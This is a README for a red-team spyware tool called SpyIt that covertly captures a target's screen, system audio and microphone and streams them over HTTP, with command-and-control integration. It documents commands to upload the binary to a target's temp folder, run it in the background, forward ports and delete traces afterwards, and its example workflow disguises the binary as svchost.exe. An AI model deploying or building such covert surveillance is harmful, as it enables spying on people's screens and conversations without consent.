# 🕵️ SpyIt

**Real-time desktop surveillance over HTTP** — zero dependencies, pure C, single binary.

Captures the target's screen via DXGI Desktop Duplication, encodes frames as JPEG, and streams them as MJPEG over a lightweight HTTP server. View the live feed from any browser. Built for red team ops with native [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2) integration — deploy, stream, watch, and clean up in seconds.

> 🎯 *Drop it. Stream it. Watch it. Kill it.*

## 📁 Project Structure

```
SpyIt/
├── Stream/
│   └── C/
│       ├── Stream.c              # Desktop capture + MJPEG HTTP server
│       ├── stream.html           # Browser-based stream viewer
│       ├── compile.bat           # Build Stream.exe (MSVC)
│       └── enum-screens.axs      # AdaptixC2 AxScript automation
├── Enum-Screens/
│   ├── C/
│   │   ├── enumerate_screens.c   # Simple monitor enumeration
│   │   └── compile.bat
│   └── BOF/
│       ├── enumerate_screens.c   # BOF version (BeaconPrintf)
│       ├── compile.bat
│       ├── enum-screens.axs      # Adaptix command for BOF
│       └── beacon.h
├── .gitignore
└── README.md
```

---

## 🎬 Stream - Desktop Capture & Stream

**Location:** `Stream/C/`

<video src="Resources/demo.mp4" controls muted loop playsinline style="max-width: 100%; height: auto;"></video>

### Features
- DXGI Desktop Duplication for low-overhead screen capture
- WIC JPEG encoding → MJPEG stream over HTTP
- System audio + microphone streaming via WASAPI (WAV)
- Audio device enumeration (render + capture)
- Mouse cursor overlay (GDI)
- Multi-monitor support with runtime screen switching
- HTML viewer with screen selection, audio controls, record (WebM), and terminate
- Runs in background (detached process) by default
- Dynamic port via `--port`

### How to build
```cmd
cd "Stream\C"
compile.bat
```

### How to run
```cmd
Stream.exe                          # Default port 40484, background
Stream.exe --port 8882              # Custom port, background
Stream.exe --port 8882 --no-detach  # Custom port, keep console
Stream.exe --logs-enable            # Enable logging to stream.log
```

### How to view
Open `stream.html` in a browser with the port as query parameter:
```
stream.html?port=40484
```
Or navigate directly to:
```
http://127.0.0.1:40484/
```

The HTML viewer includes audio device selection, play/stop, mute, and recording with audio.

### HTTP Endpoints
| Endpoint | Description |
|---|---|
| `/` | MJPEG video stream |
| `/audio/devices` | JSON array of audio devices (render + capture) |
| `/audio?device=<id>&type=render|capture` | WAV stream from selected device |
| `/screens.js` | JSONP - number of available screens |
| `/switch.js?screen=N` | JSONP - switch to screen N |
| `/terminate.js` | JSONP - stop the server |

### Dependencies (MSVC)
`user32.lib` `gdi32.lib` `dxgi.lib` `d3d11.lib` `windowscodecs.lib` `ws2_32.lib` `ole32.lib` `oleaut32.lib` `propsys.lib`

---

## 🤖 AdaptixC2 Integration

**Extension file:** `Stream/C/enum-screens.axs`

Load the script in AdaptixC2 via **AxScript → Script Manager**, then use the following commands in any beacon console:

### Commands

| Command | Description |
|---|---|
| `spyit-check` | Verify Stream.exe and stream.html exist locally |
| `spyit-upload <filename>` | Upload Stream.exe to `C:\Windows\Temp\<filename>` on target |
| `spyit-start <filename> <port>` | Run SpyIt on target with the given port |
| `spyit-connect <remote_port> [local_port]` | Create local port forward (server → target) |
| `spyit-watch <local_port>` | Copy stream viewer URL to clipboard |
| `spyit-terminate <filename> <port>` | Kill process, stop port forward, delete file |

### Typical Workflow
```
spyit-check
spyit-upload svchost.exe
spyit-start svchost.exe 40484
spyit-connect 40484
spyit-watch 40484
```
Then paste the URL from clipboard into your browser.

When done:
```
spyit-terminate svchost.exe 40484
```

---

## 📖 Enum-Screens - BOF Learning Path

**Location:** `Enum-Screens/`

A step-by-step guide to building a Beacon Object File that enumerates display monitors.

### Simple C Program
**`Enum-Screens/C/`**

Standalone EXE that uses `EnumDisplayMonitors()` and `GetMonitorInfo()` to list all monitors with resolution and position.

```cmd
cd "Enum-Screens\C"
compile.bat
enumerate_screens.exe
```

### BOF Conversion
**`Enum-Screens/BOF/`**

BOF version using `BeaconPrintf` for output. Builds x64/x86 object files. Load `enum-screens.axs` in AdaptixC2, then run:
```
enum-screens
```

---

## 🛠️ Requirements

- **Visual Studio 2017+** Build Tools (MSVC)
- Windows 10/11 SDK
- Windows target with Desktop Duplication support (Windows 8+)

---

## 📚 References

- [DXGI Desktop Duplication](https://docs.microsoft.com/en-us/windows/win32/direct3ddxgi/desktop-dup-api)
- [Windows API - EnumDisplayMonitors](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumdisplaymonitors)
- [AdaptixC2 Framework](https://github.com/Adaptix-Framework/AdaptixC2)
- [AxScript Documentation](https://adaptix-framework.gitbook.io/adaptix-framework/development/axscript)